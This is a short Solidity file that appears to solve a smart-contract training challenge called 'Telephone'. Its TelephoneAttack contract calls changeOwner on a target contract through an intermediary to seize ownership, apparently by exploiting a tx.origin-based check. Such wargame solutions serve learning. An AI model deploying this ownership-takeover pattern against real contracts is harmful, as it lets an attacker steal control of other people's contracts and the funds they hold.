// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    function attack(ITelephone _target) external {
        _target.changeOwner(msg.sender);
    }
}
